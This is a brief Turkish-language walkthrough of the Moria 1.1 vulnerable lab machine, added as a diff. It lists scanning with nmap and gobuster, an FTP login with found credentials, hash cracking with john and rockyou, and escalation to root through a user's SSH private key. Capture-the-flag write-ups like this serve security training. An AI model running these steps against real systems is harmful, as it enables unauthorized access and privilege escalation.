@@ -1,0 +1,12 @@
+MORİA 1.1 MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.97 bulundu.
+2 - nmap -sT -A 192.168.2.97
+3 - gobuster dir -u http://192.168.2.97 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
+4 - http://192.168.2.97/w/h/i/s/p/e/r/the_abyss/random.txt, Kullanıcılar: Balin, Oin, Ori, Fundin, Nain, Eru, Maeglin, Telchar To Thrain, Dain, Balrog
+5 - ftp 192.168.2.97, Balrog:Mellon
+6 - view-source:http://192.168.2.97/QlVraKW4fbIkXau9zkAPNGzviT3UKntl/
+7 - john hash -w=/usr/share/wordlists/rockyou.txt
+8 - ssh Ori@192.168.2.97
+9 - cd .ssh
+10 - cat known_hosts
+11 - ssh -i /home/Ori/.ssh/id_rsa root@127.0.0.1
